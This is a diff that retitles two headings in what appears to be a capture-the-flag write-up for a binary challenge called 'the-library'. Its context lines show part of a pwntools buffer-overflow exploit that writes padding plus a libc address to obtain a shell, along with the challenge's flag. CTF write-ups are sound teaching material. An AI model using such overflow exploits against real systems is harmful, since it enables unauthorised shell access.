@@ -12,7 +12,7 @@ There's not a lot of useful functions in the binary itself. I wonder where you c
 - [the-library.c]({{site.baseurl}}/assets/the-library/the-library.c)
 - [libc.so.6]({{site.baseurl}}/assets/the-library/libc.so.6)
 
-# Solution
+## Solution
 
 Let's take a look at the disassembly of `the-library` using IDA:
 
@@ -41,7 +41,7 @@ p.write('abcdabcdabcdabcdabcdabcd\xc5\x82\x21\x25\x9e\x7f\x00\x00\n')  # Ended u
 p.interactive()  # do whatever you want with shell here
 ```
 
-# Flag
+## Flag
 
 `flag{jump_1nt0_th3_l1brary}`
 
